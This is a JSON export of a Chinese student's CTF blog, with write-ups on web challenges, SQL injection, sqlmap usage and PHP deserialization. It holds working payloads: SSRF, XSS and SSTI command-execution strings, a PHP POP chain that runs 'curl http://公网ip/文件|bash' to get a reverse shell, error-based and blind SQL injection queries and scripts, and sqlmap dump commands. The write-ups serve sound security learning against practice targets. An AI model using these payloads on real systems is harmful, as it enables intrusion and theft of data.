{"meta":{"title":"mrl64's Blog","subtitle":"","description":"summer again","author":"liszt_lin","url":"http://example.com","root":"/"},"pages":[{"title":"categories","date":"2021-09-18T01:39:42.000Z","updated":"2021-09-18T01:41:02.269Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"About me","date":"2021-09-18T01:53:01.000Z","updated":"2021-09-18T02:31:17.308Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"我是来自fafu21级网安一班的林昊杨。我于21年暑假接触并认识了ctf并产生了极大的兴趣，希望能在大赛上创下佳绩。加入0xfafu实验室后，我将用博客记录自己的学习生活，希望与大家共同进步。"},{"title":"tags","date":"2021-09-18T01:39:20.000Z","updated":"2021-09-18T01:41:26.232Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"2021极客大挑战web-部分wp","slug":"2021极客大挑战web-部分wp","date":"2021-11-15T09:35:28.000Z","updated":"2021-11-15T09:36:24.130Z","comments":true,"path":"2021/11/15/2021极客大挑战web-部分wp/","link":"","permalink":"http://example.com/2021/11/15/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98web-%E9%83%A8%E5%88%86wp/","excerpt":"前言2021的极客大挑战结束了，题目还是挺有意思的，也粗略认识学习了很多新东西，web做了11题出来，都大致写下思路吧。","text":"前言2021的极客大挑战结束了，题目还是挺有意思的，也粗略认识学习了很多新东西，web做了11题出来，都大致写下思路吧。 Write UpWelcome2021进入网页后一串hint，得知这关考察的是html的知识，那我们先查看网页源码，发现提示要用WELCOME请求方法来请求网页，那我们抓包然后改变请求方法： 下一步是去f1111aaaggg9.php，记得保持WELCOME请求方法，访问就可以了： Dark题目给的URL是一个onion结尾的链接，这就意味着我们需要一个Tor浏览器和魔法上网工具，这些东西只能自己动手丰衣足食了，用洋葱浏览器打开链接查看源码获得flag： babyphp进入网页没有什么有效信息，查看源码发现提示我们查看robots，发现藏了一个noobcurl.php，进入之后是一段源代码： 1234567891011121314151617&lt;?phpfunction ssrf_me($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); curl_close($ch); echo $output;&#125;if(isset($_GET[&#x27;url&#x27;]))&#123; ssrf_me($_GET[&#x27;url&#x27;]);&#125;else&#123; highlight_file(__FILE__); echo &quot;&lt;!-- 有没有一种可能，flag在根目录 --&gt;&quot;;&#125; 一段curl代码，不出意外这就是题php文件包含题了，再结合提示flag在根目录中，直接构建payload： 1?url=file:///flag 得到flag： 蜜雪冰城甜蜜蜜要求我们点出第九杯饮料，然而下面菜单只有8杯饮料，f12查看发现菜单的每瓶饮料都对应了一个id，第一杯就是1，那么我们把这个id改成9，再点击菜单上的那杯饮料就可以了： 雷克雅未克进网页浏览一遍，其他都是虚的，只有中间这几行是重要的： 这一看就是伪造xff，但是这个经纬度是什么意思呢，点击一下检测位置抓个包看看： 好嘛，原来经纬度就是cookie中的数据，那我们用网站给的经纬度查询查出经纬度并代入cookie中，再伪造xff，得到一串奇奇怪怪的东西： 一般这种奇奇怪怪的东西放在控制台里跑都会有惊喜出现： babyxss关于xss具体原理等等等之后刷DVWA再具体细说，这里就简单讲下解法。 第一种解法，由于我们发现alert被过滤了，那么我们可以使用Data URI，插入一个html文档来进行注入： 1&lt;/script&gt;&lt;script src=data:text/html,%61%6c%65%72%74(1)&gt; 第二种解法，有点魔幻，我也不会解释，就直接给payload以及链接了： 1&quot;+[][(&#x27;&#x27;+!1)[3]+(&#x27;&#x27;+&#123;&#125;)[1]+(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[0]][(&#x27;&#x27;+&#123;&#125;)[5]+(&#x27;&#x27;+&#123;&#125;)[1]+(&#x27;&#x27;+&#123;&#125;[0])[1]+(&#x27;&#x27;+!1)[3]+(&#x27;&#x27;+!0)[0]+(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[2]+(&#x27;&#x27;+&#123;&#125;)[5]+(&#x27;&#x27;+!0)[0]+(&#x27;&#x27;+&#123;&#125;)[1]+(&#x27;&#x27;+!0)[1]]((&#x27;&#x27;+!1)[1] + (&#x27;&#x27;+!1)[2] + (&#x27;&#x27;+!1)[4] +(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[0]+&quot;(1)&quot;)())// 上述payload分析 两种解法都可以得到flag： babypy一题flask SSTI漏洞题，做题时简单学习了下，具体原理可以参考这篇博客：flask SSTI漏洞 直接讲题，首先获取基本类，这里用mro试了好像不行，因此用base来进行注入： 1&#123;&#123;&#123;&#125;.__class__.__bases__[0]&#125;&#125; 获得基本类名只有一个object，接下来获取其子类： 1&#123;&#123;&#123;&#125;.__class__.__bases__[0].__subclasses__()&#125;&#125; 可以发现这个子类是相当的多啊，，但其实关键的也就那几个，搜索一番其中有一个叫warnings.catch_warnings，首先我们要定位这个子类的位置，这题不能直接通过命令获取，那我们就大致判断缩小范围，最后锁定位置是208。接着直接构建命令拿到flag： 1&#123;&#123;&#123;&#125;.__class__.__bases__[0].__subclasses__()[208].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125; babyPOPphp反序列化的题目。代码审计一遍： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 &lt;?phpclass a &#123; public static $Do_u_like_JiaRan = false; public static $Do_u_like_AFKL = false;&#125;class b &#123; private $i_want_2_listen_2_MaoZhongDu; public function __toString() &#123; if (a::$Do_u_like_AFKL) &#123; return exec($this-&gt;i_want_2_listen_2_MaoZhongDu); &#125; else &#123; throw new Error(&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;); &#125; &#125;&#125;class c &#123; public function __wakeup() &#123; a::$Do_u_like_JiaRan = true; &#125;&#125;class d &#123; public function __invoke() &#123; a::$Do_u_like_AFKL = true; return &quot;关注嘉然,&quot; . $this-&gt;value; &#125;&#125;class e &#123; public function __destruct() &#123; if (a::$Do_u_like_JiaRan) &#123; ($this-&gt;afkl)(); &#125; else &#123; throw new Error(&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;); &#125; &#125;&#125;if (isset($_GET[&#x27;data&#x27;])) &#123; unserialize(base64_decode($_GET[&#x27;data&#x27;]));&#125; else &#123; highlight_file(__FILE__);&#125; 具体分析：我们发现能够获取flag文件的只有exec()函数，而要触发则需要a::$Do_u_like_AFKL为true，在类d中的__invoke()方法可以做到这点。__invoke()会在脚本尝试将对象调用为函数时触发，我们在类e中找到了这一触发方式，因为我们在类c中使得a::$Do_u_like_JiaRan；所以只要在类e中使$afkl=new d()即可。而类c是一个__wakeup()方法，因此我们反序列化的对象应该就是类c。同时类b是一个__toString()方法，一个对象被当作字符串使用时触发,这个方法在类d中被发现。 这就都对上了，接下来构建payload。在类d中将$this-&gt;value赋值为类b的实例化对象即可输出类b，但d中没有$value变量，因此我们自己创造一个。接着调用d类，在类e中使$afkl=new d()即可。最后将类c和类e连接，在类c中构造一个变量，使他的值为new e()即可。 而由于exec()无回显，因此需要进行反弹shell。 最后payload： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?phpclass a &#123; public static $Do_u_like_JiaRan = false; public static $Do_u_like_AFKL = false;&#125;class b &#123; private $i_want_2_listen_2_MaoZhongDu; public function __construct() &#123; $this-&gt;i_want_2_listen_2_MaoZhongDu=&quot;curl http://公网ip/文件|bash&quot;; &#125; public function __toString() &#123; if (a::$Do_u_like_AFKL) &#123; return exec($this-&gt;i_want_2_listen_2_MaoZhongDu); &#125; else &#123; throw new Error(&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;); &#125; &#125;&#125;class c &#123; public $b; public function __wakeup() &#123; a::$Do_u_like_JiaRan = true; &#125;&#125;class d &#123; public $value; public function __invoke() &#123; a::$Do_u_like_AFKL = true; return &quot;关注嘉然,&quot; . $this-&gt;value; &#125;&#125;class e &#123; public $afkl; public function __destruct() &#123; if (a::$Do_u_like_JiaRan) &#123; ($this-&gt;afkl)(); &#125; else &#123; throw new Error(&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;); &#125; &#125;&#125;$c=new c();$e=new e();$d=new d();$b=new b();$b-&gt;value=$b;$d-&gt;value=$b;$e-&gt;afkl=$d;$c-&gt;b=$e;echo base64_encode(serialize($c)); 将输出结果get进网页，进行反弹shell，得到flag： Baby_PHP_Black_Magic_Enlightenment进入网页先进行代码审计：GET进一个password，这个值要大于9999但不能是个数字，这种题做过很多次了，password=10000a就可以了。但是发现虽然显示了”How’s that possible”，但是页面却没有回显2.php的内容，可能是被注释了，f12查看发现确实如此： 前往下一步，又是一串代码，审计一遍发现意思是GET一个user和一个pass，两者的内容不能一致但是sha1加密后的值要相等，这里利用sha1函数与md5函数共有的漏洞，以数组的方式进行检测： 1?user[0]=123&amp;pass[1]=123 这样我们就成功进入了下一关baby_revenge.php，这次也是sha1产生的hash碰撞，但是数组被过滤掉了，看起来这次是碰到硬茬了。但是在我查找资料的时候，找到了这么一篇博客：关于SHA1碰撞——比较两个binary的不同之处这篇博客的内容相当的厉害，里面提到了google出两个SHA1值相同而不一样的pdf文件并利用了这两个文件进行hash碰撞，我们直接构造这个payload得到下一个文件here_s_the_flag.php： 这是最后一关了，我们要GET一个id进去，要求id进行一次url解码后要是字符串”Longlone”，但是id中不能检测到”Longlone”。这一关其实也很简单，因为网页在读取时会先进行一次url解码，接着代码中会再次进行一次，因此我们将这个字符串进行两次url编码就可以了。 babysql最简单的sql注入了，POST类型。直接用sqlmap跑就能出来了。手工注入我测试出来了联合注入，盲注等等都可以，报错注入由于无回显因此不能使用。这里就跑个sqlmap吧： 12345678910111213141516171819202122232425262728293031323334353637383940414243python2 sqlmap.py -r 1.txt --dbsavailable databases [6]:[*] babysql[*] flag[*] information_schema[*] mysql[*] performance_schema[*] testpython2 sqlmap.py -r 1.txt -D flag --tablesDatabase: flag[1 table]+-------+| fllag |+-------+python2 sqlmap.py -r 1.txt -D flag -T fllag --columnsDatabase: flagTable: fllag[2 columns]+-----------+--------------+| Column | Type |+-----------+--------------+| fllllllag | varchar(100) || wlz | varchar(100) |+-----------+--------------+python2 sqlmap.py -r 1.txt -D flag -T fllag -C fllllllag --dumpDatabase: flagTable: fllag[1 entry]+------------------------+| fllllllag |+------------------------+| SYC&#123;U_4N0vv_Sql_Noyv~&#125; |+------------------------+ anothersql这题就存在着一定的过滤了，联合查询不能用，updatexml和extractvalue也是被过滤了，但是floor，没有被过滤，用floor过滤就可以了： 123456789101112131415161718admin&#x27; and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a)#Duplicate entry &#x27;true____flag1&#x27; for key &#x27;&lt;group_key&gt;&#x27;admin&#x27; and (select 1 from (select count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;true____flag&#x27;),floor (rand(0)*2))x from information_schema.tables group by x)a)#Duplicate entry &#x27;syclover1&#x27; for key &#x27;&lt;group_key&gt;&#x27;admin&#x27; and (select 1 from (select count(*),concat((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;true____flag&#x27; and table_name=&#x27;syclover&#x27;),floor (rand(0)*2))x from information_schema.tables group by x)a)#Duplicate entry &#x27;id,uname,pwd,flag1&#x27; for key &#x27;&lt;group_key&gt;&#x27;admin&#x27; and (select 1 from (select count(*),concat((select concat(flag) from syclover limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)#Duplicate entry &#x27;SYC&#123;U_4N0vv_3rR0r_Inj3c410n&#125;1&#x27; for key &#x27;&lt;group_key&gt;&#x27; 总结这次比赛还是见识了很多新玩意儿的，以后刷靶场的时候可以进行拓展，也巩固了已有的只是，继续努力。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-ctf -web","slug":"ctf-web","permalink":"http://example.com/tags/ctf-web/"}]},{"title":"【2021深育杯】misc-login write up","slug":"【2021深育杯】misc-login-write-up","date":"2021-11-13T11:02:51.000Z","updated":"2021-11-13T12:38:24.591Z","comments":true,"path":"2021/11/13/【2021深育杯】misc-login-write-up/","link":"","permalink":"http://example.com/2021/11/13/%E3%80%902021%E6%B7%B1%E8%82%B2%E6%9D%AF%E3%80%91misc-login-write-up/","excerpt":"前言别问为什么一个web手写了个misc的题，问就是web根本不会。这次比赛连签到题全队做了3题，并列70-80名那一带。","text":"前言别问为什么一个web手写了个misc的题，问就是web根本不会。这次比赛连签到题全队做了3题，并列70-80名那一带。 write up直接上题吧。首先进去是个网页，要我们进行一个陆的登，当然我们既不知道账号也不知道密码，那我们就点击获取实例进去，发现跳转到一个新的网页，我们可以通过获取提示文档来获得一个example.zip。虽然网页怂恿我们把其中的内容发送到一个邮箱里，但hint告诉我们此乃谎言。 打开zip发现是加密文档，但是有一点很奇怪，就是zip内有一个示例.txt和一个该文件的副本，我们合理怀疑这里有个伪加密，因此我们备份一个文件，然后拿example.zip扔进ZipCenOp里跑一下： 1java -jar ZipCenOp.jar r example.zip 果然我们发现这个副本文件是伪加密，跑完ZipCenOp后打开example.zip就可以直接将副本文件解压出来了。解压出来后就是明文破译zip密码了，这里压缩副本文件时一定要用winrar，否则明文破译会失败。 我们用AZPR来跑：密码是qwe@123 这样password.zip就被我们解压出来了，点开之后发现又是加密文档，不过这回的文档里是一个swp文件和3个大小为6的txt文件，CRC32又是已知的（分别为0x21137233；0x4B8F7BE7；0x1028C889)，很容易判断出来我们要对这三个txt进行CRC碰撞，这里我们用crc32 tools进行crc碰撞，如果大小超过6位这个脚本就不能用了。 碰撞结果： 我们这里分析拼接，得到zip的密码应该是welc0me_sangforctf，解压出.password.swp，用010Editor打开文件，翻到最后，发现这么几行： 这就是我们的账号和密码了，我们直接用账号和密码登录，网页也提示我们成功找到了flag，可是我们发现f12和鼠标右键被禁用了，因此我们需要在登录前就提前打开f12，再进行登陆，终于找到了flag： 总结这次比赛我明白了几个道理： web不是人能做的 带easy的题目是最难的 不务正业也挺快乐的（bushi 下周极客大挑战结束再写一份wp，这周划了。","categories":[{"name":"misc","slug":"misc","permalink":"http://example.com/categories/misc/"}],"tags":[{"name":"-ctf -misc","slug":"ctf-misc","permalink":"http://example.com/tags/ctf-misc/"}]},{"title":"sql无列名注入与作业wp","slug":"sql无列名注入与作业wp","date":"2021-11-11T09:08:46.000Z","updated":"2021-11-12T12:23:51.988Z","comments":true,"path":"2021/11/11/sql无列名注入与作业wp/","link":"","permalink":"http://example.com/2021/11/11/sql%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E4%B8%8E%E4%BD%9C%E4%B8%9Awp/","excerpt":"前言实训室讲了mysql的联合查询注入与无列名注入，因为联合查询做靶场就写过了，这里就专门解析无列名注入，并且写下布置的作业wp。","text":"前言实训室讲了mysql的联合查询注入与无列名注入，因为联合查询做靶场就写过了，这里就专门解析无列名注入，并且写下布置的作业wp。 无列名注入从实战中开始讲起。以[极客大挑战]Lovesql为例，这题直接联合查询也是可以的，跑sqlmap也是可以的，但这就很没意思了。因此我们用无列名注入来解题(order by跑出来有3列，且2,3列可显)。 首先，我们考虑使用无列名注入的条件是information_schema这个数据库被过滤了，导致我们无法使用联合注入。在高版本的mysql中，我们可以使用mysql.innodb_table_stats或者sys.schema_auto_increment_columns等等来获取表名，这里我们构造第一句payload： 1111&#x27; union select 1,(select group_concat(table_name) from mysql.innodb_table_stats),3 # 获取表名之后，由于无法获得字段名，因此我们编写无列名注入的payload： 1111&#x27; union select 1,2,(select `3` from (select 1,2,3 union select * from l0ve1ysq1)a)# 来分析一下这段payload，首先整体上还是一个联合查询语句，但是区别于平常的联合查询，这里原本用来查询列名的语句被替换成了不使用列名进行查询的无列名注入语句。无列名注入的原理简单来说就是将我们不知道的列名先取一个别名，同时进行数据查询。 具体的原理解析可以参考这条链接的内容：mysql无列名注入 这样我们就不难看出，这句payload起到的作用就是将1,2,3三个数字对应了数据表中的1,2,3列，并同时对第三列进行查询。最后一个字母a相当于一个名字，可以使用任意字符代替。 在实战中，反引号是基本上不会放出来的（当然这题没有被过滤），因此我们可以采用别名法带入的方式避免payload中出现反引号： 1111&#x27; union select 1,2,(select t from (select 1,2,3 as t union select * from l0ve1ysq1)a)# 我们将t这个别名赋予了3，这样上面的两句payload是完全等价的。在注入过程中发现返回值超过一行，使用limit语句一个个注入，最后发现下面这句payload得到了flag： 1111&#x27; union select 1,2,(select `3` from (select 1,2,3 union select * from l0ve1ysq1 limit 16,1)a)# 具体学习无列名注入，除了上面的那个链接外，还可以通过下面这个链接进行具体学习：Bypass information_schema与无列名注入 [GYCTF2020]Ezsqli write up一进网页就是孙笑川的大脸，还有懒得做前端的师傅的疯狂吐槽。这都不重要，重要的是最下面的数据查询，我们先判断注入方式。但是当我输入进1’进入时，它回显了一个bool(false)，我觉得有点不对劲，马上拿出了异或注入进行测试，结果我发现我被偷袭了。 这题还是道盲注题！当我注入1^1^1时，回显为“Nu1L”，而注入1^0^1时，回显的是“Error Occured When Fetch Result.”。而且经过测试，or被过滤了，因此我们还需要采用无列名注入的方式进行注入。 先测试了下database()的长度应该是21：好家伙这数据库名这么长，那只能跑脚本了，由于还没有脚本经验，因此就大概写下payload的构建。 首先是爆表： 11^ascii(substr((select group_concat(table_name) from mysql.innodb_table_stats where table_schema=database()),1,1))=103^1 由于information_schema被过滤，因此我们使用mysql.innodb_table_stats来查表名，这句payload就是句很平常的布尔盲注，表格的名称是“f1ag_1s_h3r3_hhhhh”。 接着要查询数据，我们构建一个这样的payload： 11^((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh)).format(flag)^1 这句payload的原理是将大于号左右两边的字符串进行比较，如果左边较大则返回1，否则返回0，这样我们就可以判断。要注意字段数，如果查询失败应该更改左边的字段数并再次进行注入。 详细分析下这段payload，就是将f1ag_1s_h3r3_hhhhh表中的数据内容的ascii码值与“flag”字符的ascii值相比（format将前面的{}替换成flag），这样一步步就可以将flag跑出来了。 当然，由于这里用的是＞号，因此脚本中要将输出的字符减1，因为判断成功时花括号内的字符是比实际内容大1的。 最后偷一个大佬的脚本吧： 1234567891011121314import requestsflag=&#x27;&#x27;url=&#x27;http://ca5cdac5-e97e-42df-9ed0-233bc75b4c4d.node3.buuoj.cn/index.php&#x27;for i in range(1,50): for j in range(33,127): payload = &quot;1&amp;&amp;ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;&quot; data=&#123; &#x27;id&#x27;: payload &#125; r=requests.post(url,data=data) if &#x27;Nu1L&#x27; in r.text: flag=flag+chr(j) print(flag) break 爆表脚本 12345678910111213141516import requestsurl = &#x27;http://6c05130d-3668-41d6-9ad6-5e69ce00e0cc.node3.buuoj.cn/index.php&#x27;x=&#x27;&#x27;for j in range(1,50): for i in range(33,127): flag=x+chr(i) payload = &quot;1&amp;&amp;((1,&#x27;&#123;&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;.format(flag) data=&#123; &#x27;id&#x27;:payload &#125; r = requests.post(url,data=data) if &#x27;Nu1L&#x27; in r.text: x=x+chr(i-1) print(x) break 爆数据脚本 总结sql注入又一块拼图补上了，接下来就是继续刷题刷靶场的时间了。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web前端 -mysql","slug":"web前端-mysql","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-mysql/"}]},{"title":"sqlmap使用练习","slug":"sqlmap使用练习","date":"2021-11-06T01:14:59.000Z","updated":"2021-11-06T05:50:39.892Z","comments":true,"path":"2021/11/06/sqlmap使用练习/","link":"","permalink":"http://example.com/2021/11/06/sqlmap%E4%BD%BF%E7%94%A8%E7%BB%83%E4%B9%A0/","excerpt":"前言手动进行SQL注入效率还是没有工具高啊，掌握对工具的使用可以帮助我们提高效率。先以sqli-labs基础篇为例学习sqlmap基础功能。","text":"前言手动进行SQL注入效率还是没有工具高啊，掌握对工具的使用可以帮助我们提高效率。先以sqli-labs基础篇为例学习sqlmap基础功能。 GET型注入联合查询less1-4注入都是很相似的，我们就以第一关为例。我们可以先检测注入方式：python sqlmap.py -u http://127.0.0.1/sqli-labs-php7/Less-1/?id=1 --dbms --batch -u：指定url –batch: 执行过程中不需要用户输入YES or NO，将会使用sqlmap提示的默认值YES一直运行下去。推荐都可以添加进 –dbms：指定数据库 结果如下：系统给出了四种注入方式，分别是布尔盲注、报错注入、时间盲注和联合查询，我们也可以从payload看出这题是基于单引号的错误进行注入。 接下来我们开始进行注入，下面介绍如何一步步从数据库查到表格中的数据： –dbs：爆出所有数据库名称 –current-db：获取当前数据库名称 -D database_name –tables：获取指定数据库中的表名 -D database_name -T table_name –columns：获取指定表格的列名 -D database_name -T table_name -C cname1[,cname2,cname3…] –dump：获取指定列的数据 结果如下：python sqlmap.py -u http://127.0.0.1/sqli-labs-php7/Less-1/?id=1 --dbs python sqlmap.py -u http://127.0.0.1/sqli-labs-php7/Less-1/?id=1 -D security --tables python sqlmap.py -u http://127.0.0.1/sqli-labs-php7/Less-1/?id=1 -D security -T users --columns python sqlmap.py -u http://127.0.0.1/sqli-labs-php7/Less-1/?id=1 -D security -T users -C id,username,password --dump 报错注入&amp;盲注其实直接用上面的语句也是可以的，但是这时我们会发现，sqlmap的注入用时大大延长，这是因为sqlmap检测到了多种注入方法，然后一个一个跑下来，等到成功了再返回结果，因此介绍如何指定过滤方法： –technique X：指定注入技术，支持5种形式，根据不同方法指定X的值（指定多个也可以，例如要指定报错和时间盲注就是ET） 12345B:Boolean-based-blind （布尔型型注入）E:Error-based （报错型注入）U:Union query-based （联合注入）S:Starked queries （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）T:Time-based blind （基于时间延迟注入，默认5秒） 盲注时，为了提高效率，我们也可以设置最大并发线程： –threads：最大并发线程，盲注时每个线程获取一个字符，获取完成后线程结束，默认为1，建议不要超过10 这样可以大大提高注入效率。 POST型注入针对POST型注入有两种方式。 –data：添加数据段 例如：python sqlmap.py -u http://127.0.0.1/sqli-labs-php7/Less-11 --data &quot;uname=1 &amp;passwd=1 &amp;submit=Submit&quot; --dbs 当然我们一般不这样做，因为这样构造比较麻烦，我们一般使用burp suit抓包后将内容存在txt文档中，这个文档也一般放在sqlmap的根目录中，然后构建下面这个指令（文件存入1.txt中）：python sqlmap.py -r 1.txt --dbs 为什么推荐下面这种做法呢，一个是因为这样构造的指令比较简单，另一个是因为这样当我们设置高level时就会检测文件头中的其他参数，下面介绍sqlmap的几个等级： –level 1：默认值，能测试的语句少，速度快 –level 2：测试http、cookie –level 3：测试user-agent、referer 当level为5时会测试很多的payload，效率会降低。当不清楚注入点时可以将level的值设置为3或以上。 当然当清楚注入点时，也可以用例如--cokkie、--user-agent这类的语句指定注入目标，这样可以不用抓包，也可以不用设置level：python sqlmap.py -u http://127.0.0.1/sqli-labs-php7/Less-19/ --referer=&quot; http://127.0.0.1/sqli-labs-php7/Less-19/*&quot; --dbs Tamper注入时遇到过滤一定是不可避免的，我们可以用sqlmap自带的tamper脚本进行各种的绕过。 例如21关中对cookie需要进行base64解码，我们就可以使用--tamper=base64encode来解决 不过在我们不太清楚具体过滤的内容时，我们可以直接无脑套tamper，虽然效率偏低，但是十分方便：tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotestamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor 总结sqlmap还有很多很强大的功能，下面的链接总结了sqlmap的所有指令可供参考。sqlmap指令大全","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web前端 -mysql","slug":"web前端-mysql","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-mysql/"}]},{"title":"php反序列化漏洞应用","slug":"php反序列化漏洞应用","date":"2021-11-01T10:07:52.000Z","updated":"2021-11-02T11:42:12.413Z","comments":true,"path":"2021/11/01/php反序列化漏洞应用/","link":"","permalink":"http://example.com/2021/11/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%BA%94%E7%94%A8/","excerpt":"前言同样是buu，同样是极客大挑战，这次遇到了一题有关于php反序列化漏洞，遇到新东西总是要开博客记录的嘛。","text":"前言同样是buu，同样是极客大挑战，这次遇到了一题有关于php反序列化漏洞，遇到新东西总是要开博客记录的嘛。 [极客大挑战 2019]PHP进入网页，我们发现一只猫在网页中心，我们鼠标控制着一团毛线，诶还挺好玩的。咳咳，进入正题，我们抓住题目给我们的提示——备份网站。一般备份网站的备份文件是在www.zip中，当然我们也可以用dirsearch来进行扫描，发现www.zip的状态为200： 接着我们打开备份文件，发现一个flag.php文件，但是显然我们能直接阅读到的并不是真正的flag。那么我们来阅读index.php代码： 12345&lt;?phpinclude &#x27;class.php&#x27;;$select = $_GET[&#x27;select&#x27;];$res=unserialize(@$select);?&gt; 我们注意到了这一行，变量select以GET方式输入，并进行反序列化，而且包含了文件class.php，那么我们打开class.php一探究竟： 123456789101112131415161718192021222324252627282930313233class Name&#123; private $username = &#x27;nonono&#x27;; private $password = &#x27;yesyes&#x27;; public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; function __wakeup()&#123; $this-&gt;username = &#x27;guest&#x27;; &#125; function __destruct()&#123; if ($this-&gt;password != 100) &#123; echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); &#125; if ($this-&gt;username === &#x27;admin&#x27;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;; die(); &#125; &#125;&#125; 这里代码创建了一个结构体Name，设置其中的username与password。那么我们发现，只要设置username=admin&amp;password=100，那么再次执行_destruct就可以回显flag了。 但是这里有个问题，wakeup会导致username被赋值成guest，那么我们就需要改变序列化字符串中对象的个数来绕过，我们使用下面这个程序生成URL： 123456789&lt;?phpclass Name&#123; private $username = &#x27;admin&#x27;; private $password = &#x27;100&#x27;;&#125;$a = new Name();echo urlencode(serialize($a));?&gt; 使用URL编码保证不可打印字符复制时不会丢失（当然也可以不编码），编码与不编码的结果分别如下： 12O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7DO:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125; 将Name后的2改为3（大一点也行），再输入进select中获取flag： 解毕 序列化与反序列化序列化是将变量或对象转换成字符串的过程，而反序列化是将字符串转化为变量或对象的过程，序列化与反序列化主要是为了方便对象的传输。一般在php中常用的序列化与反序列化方式有：serialize，unserialize；json_encode，json_decode一般在ctf中前者的使用更多。 这里介绍php序列化和反序列化基本类型表达： 布尔型：b:value =&gt; b:0 整数型：i:value =&gt; i:1 字符串型：s:length:value =&gt;s:4 “aaaa” 数组型：a::{key, value pairs} =&gt;a:1:{i:1;s:1 “a”} 对象型：O: NULL型：N 下面这篇博客中详细剖析了PHP序列化与反序列化，想要详细学习可以参考，本篇博客不做详细的介绍。深度剖析PHP序列化和反序列化 反序列化漏洞的利用（随时更新）利用这个漏洞有两个条件： unserialize()函数的参数是可控的 php中有可利用的类并且类中含有魔术方法 魔术方法中存在任意代码执行的eval 然后再介绍一批魔术方法： 1234567__construct()：创建对象时初始化__destruct()：结束时销毁对象__toString()：对象被当作字符串时使用__sleep()：序列化对象之前调用__wakeup()：反序列化之前调用__call()：调用对象不存在时使用__get()：调用私有属性时使用 由此我们可以看出，当传给反序列化函数的参数可控时，我们可以传入一个序列化字符串从而控制对象内部的变量甚至函数。那么我们来详细介绍几个常见的反序列化漏洞的应用。 CVE-2016-7124（_wakeup()绕过）当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行，也就是上面的例题中我们使用的绕过方法，这里不再赘述。 phar反序列化phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都被储存在phar文件内容描述着部分中。而这个部分还会以序列化形式存储用户自定义的meta-data，这是攻击的核心部分。 phar归档文件有三种格式：tar归档、zip归档和phar归档。phar格式的文件允许我们完全控制文件的起始部分，而最小的标志（stub）可以作为任意数据的前缀，也是phar文件中的第一项。因此我们可以伪造文件头来绕过对文件格式的检测，我们可以构造一个既是合法jpeg文件又是一个合法的phar文件。 要生成phar文件，我们首先要修改php.ini中phar.readonly的选项，删去前面的分号，并将On改为Off。接着我们生成phar文件： 12345678910111213&lt;?php class Test&#123; &#125; @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); 